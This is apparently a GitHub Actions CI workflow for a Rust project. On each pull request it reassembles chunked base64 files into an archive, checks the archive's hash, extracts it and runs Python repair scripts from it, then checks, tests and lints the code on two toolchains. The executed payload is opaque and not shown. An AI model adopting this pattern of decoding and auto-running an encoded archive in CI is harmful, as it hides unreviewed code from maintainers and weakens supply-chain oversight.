name: CodeSpace v3 Rust diagnostic

on:
  pull_request:
    branches:
      - main

permissions:
  contents: read

jobs:
  diagnose:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: Reproduce generated repair with MSRV and current toolchains
        shell: bash
        env:
          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          set -euo pipefail
          mkdir repo
          cd repo
          git init --quiet
          git fetch --quiet --depth 1 https://github.com/IvanChernykh/CodeSpace.git "$PR_HEAD_SHA"
          git checkout --quiet FETCH_HEAD
          cat .repair/v3/chunk-* > /tmp/payload.b64
          base64 --decode /tmp/payload.b64 > /tmp/payload.tar.gz
          echo "9145789e504649860b5165003e860d913ec19969b9a62073150d8733fec7239b  /tmp/payload.tar.gz" | sha256sum --check -
          tar -xzf /tmp/payload.tar.gz
          python .repair/v3/pre_apply.py
          python scripts/apply_v3_repair.py
          python .repair/v3/post_apply.py
          python .repair/v3/test_clippy.py

          rustup toolchain install 1.85.0 --profile minimal --component rustfmt,clippy >/dev/null
          cargo +1.85.0 fmt --all
          if ! cargo +1.85.0 check --locked --message-format=short > /tmp/msrv-check.log 2>&1; then
            echo "=== MSRV CHECK FAILURE ==="
            cat /tmp/msrv-check.log
            exit 1
          fi
          if ! cargo +1.85.0 test --locked --all-targets --message-format=short > /tmp/msrv-test.log 2>&1; then
            echo "=== MSRV TEST FAILURE ==="
            cat /tmp/msrv-test.log
            exit 1
          fi
          if ! cargo +1.85.0 clippy --locked --all-targets --all-features --message-format=short -- -D warnings > /tmp/msrv-clippy.log 2>&1; then
            echo "=== MSRV CLIPPY FAILURE ==="
            cat /tmp/msrv-clippy.log
            exit 1
          fi
          echo "MSRV 1.85 passed"

          cargo +1.97.1 fmt --all
          if ! cargo +1.97.1 check --locked --message-format=short > /tmp/current-check.log 2>&1; then
            echo "=== CURRENT CHECK FAILURE ==="
            cat /tmp/current-check.log
            exit 1
          fi
          if ! cargo +1.97.1 test --locked --all-targets --message-format=short > /tmp/current-test.log 2>&1; then
            echo "=== CURRENT TEST FAILURE ==="
            cat /tmp/current-test.log
            exit 1
          fi
          if ! cargo +1.97.1 clippy --locked --all-targets --all-features --message-format=short -- -D warnings > /tmp/current-clippy.log 2>&1; then
            echo "=== CURRENT CLIPPY FAILURE ==="
            cat /tmp/current-clippy.log
            exit 1
          fi
          echo "Current Rust 1.97 passed"
